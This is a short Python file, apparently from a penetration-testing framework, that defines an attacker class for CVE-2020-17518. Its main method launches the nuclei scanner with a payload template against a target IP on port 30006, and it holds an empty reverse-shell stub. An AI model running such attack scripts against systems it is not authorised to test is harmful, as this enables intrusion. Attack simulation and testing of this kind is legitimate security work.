from attackerBase import *
from attackConfig import *



class PT_CVE_2020_17518_Attacker2(AttackerBase):
    
    def __init__(self, ip_addr, yaml_path):
        self.ip_addr = ip_addr
        self.yaml_path = yaml_path
        self.commandRunner = CommandRunner()

    def discovery(self) -> None:
        pass

    def main(self):
        self.commandRunner.runCommand('nuclei -u http://' + self.ip_addr +':30006  -t ' + self.yaml_path + 'YAMLs/CVE-2020-17518_payload1.yaml -silent')

    def reverseShell(self):
        pass
       


if __name__ == '__main__':
    
    # Call your custom attacks here
    pass

